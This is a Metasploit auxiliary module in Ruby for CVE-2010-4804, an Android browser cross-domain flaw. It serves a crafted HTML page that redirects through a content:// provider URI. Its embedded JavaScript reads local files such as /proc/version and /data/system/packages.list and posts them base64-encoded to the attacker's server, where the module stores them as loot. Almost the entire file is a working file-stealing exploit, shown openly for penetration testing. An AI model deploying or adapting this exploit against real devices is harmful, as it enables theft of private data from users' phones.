##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Android Content Provider File Disclosure',
      'Description' => %q{
          This module exploits a cross-domain issue within the Android web browser to
        exfiltrate files from a vulnerable device.
      },
      'Author'      =>
        [
          'Thomas Cannon',   # Original discovery, partial disclsoure
          'jduck'            # Metasploit module
        ],
      'License'     => MSF_LICENSE,
      'Actions'     =>
        [
          [ 'WebServer' ]
        ],
      'PassiveActions' =>
        [
          'WebServer'
        ],
      'References' =>
        [
          [ 'CVE', '2010-4804' ],
          [ 'URL', 'http://thomascannon.net/blog/2010/11/android-data-stealing-vulnerability/' ]
        ],
      'DefaultAction'  => 'WebServer'))

    register_options(
      [
        OptString.new('FILES', [ false, "The remote file(s) to steal",
          '/proc/version,/proc/self/status,/data/system/packages.list' ])
      ])
  end

  def on_request_uri(cli, request)
    print_status("Request '#{request.method} #{request.uri}'")
    selected_headers = [ 'user-agent', 'origin', 'referer' ]
    request.headers.each_key { |k|
      next if not selected_headers.include? k.downcase
      print_status("#{k}: #{request.headers[k]}")
    }

    return process_post(cli, request) if request.method == "POST"

    # Only GET requests now..
    if request.uri =~ /\.html?$/
      filename = request.uri.split('/').last
      target_files = datastore['FILES'].split(',').map{ |e|
        "'%s'" % e
      }.join(',')

      upload_url = get_uri(cli)
      upload_url << '/' if upload_url[-1,1] != '/'
      upload_url << 'q'

      html = <<-EOS
<html>
<body>
<script lang=javascript>
var target_files = Array(#{target_files});
var results = new Array();
function addField(form, name, value) {
  var hf = document.createElement('input');
  hf.setAttribute('type', 'hidden');
  hf.setAttribute('name', name);
  hf.setAttribute('value', value);
  form.appendChild(hf);
}
function uploadFiles(files) {
  var form = document.createElement('form');
  form.setAttribute('method', 'POST');
  form.setAttribute('action', '#{upload_url}');
  var i = 0;
  for (var fn in files) {
    addField(form, 'f'+i, btoa(fn));
    addField(form, 'd'+i, files[fn]);
    i += 1;
  }
  document.body.appendChild(form);
  form.submit();
}
for (var fn in target_files) {
  fn = target_files[fn];
  xh = new XMLHttpRequest();
  xh.open('GET', fn, false);
  xh.onreadystatechange = function() { if (xh.readyState == 4) { results[fn] = btoa(xh.responseText); } }
  xh.send();
}
uploadFiles(results);
</script>
</body>
</html>
EOS

      print_status("Sending payload HTML ...")
      send_response_html(cli, html,
        {
          'Cache-Control' => 'public',
          'Content-Description' => 'File Transfer',
          'Content-Disposition' => "attachment; filename=#{filename}",
          'Content-Transfer-Encoding' => 'binary',
          'Content-Type' => 'text/html'
        })


    else
      payload_fn = Rex::Text.rand_text_alphanumeric(4+rand(8))

      html = <<-EOS
<html>
<body>
<script lang=javascript>
setTimeout("document.location = 'content://com.android.htmlfileprovider/sdcard/download/#{payload_fn}.html';", 5000);
setTimeout("document.location = '#{payload_fn}.html';", 500);
</script>
</body>
</html>
EOS

      print_status("Sending initial HTML ...")
      send_response_html(cli, html)

    end
  end

  def process_post(cli, request)

    results = {}

    if request and request.body
      request.body.split('&').each { |var|
        parts = var.split('=', 2)
        if parts.length != 2
          print_error("Weird, we got a var that doesn't contain an equals: #{parts.inspect}")
        else
          fln,fld = parts
          fld = Rex::Text.uri_decode(fld).unpack('m').first
          start = fln.slice!(0,1)
          if start == "f"
            results[fln] ||= {}
            results[fln][:filename] = fld
          elsif start == "d"
            results[fln] ||= {}
            results[fln][:data] = fld
          end
        end
      }
    end

    results.each_key { |k|
      e = results[k]
      fn = e[:filename]
      data = e[:data]
      print_good("#{fn.inspect} contains #{data.inspect}")

      fn.gsub!(/[\/\\]/, '.')
      fn.gsub!(/^\./, '')
      store_loot('android.fs.'+fn, 'application/octet-stream', cli.peerhost, data, fn)
    }

    send_response_html(cli, "thx")
  end

  def run
    exploit()
  end
end
